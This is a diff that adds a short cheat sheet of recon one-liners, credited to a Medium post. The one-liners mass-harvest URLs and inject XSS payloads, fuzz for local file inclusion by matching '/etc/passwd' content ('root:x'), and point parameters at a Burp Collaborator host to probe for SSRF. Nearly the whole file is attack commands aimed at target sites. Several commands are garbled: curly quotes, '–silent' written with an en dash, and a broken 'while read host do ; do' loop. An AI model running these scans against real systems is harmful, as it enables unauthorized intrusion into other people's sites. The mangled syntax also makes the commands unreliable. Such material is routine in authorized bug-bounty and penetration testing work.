@@ -1,0 +1,25 @@
+https://medium.com/@megadeathgamer54/find-ssrf-lfi-xss-using-httpx-waybackurls-gf-gau-qsreplace-34880c056df0
+
+>> XSS
+
+cat urls.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done
+
+echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+>> LFI
+
+findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
+
+cat lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w /home/kali/wordlist/lfi_payloads.txt ; done
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+>> SSRF
+
+findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net
+
+cat httpx.txt | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net
+
+--------------------------------------------------------------------------------------------------------------------------------
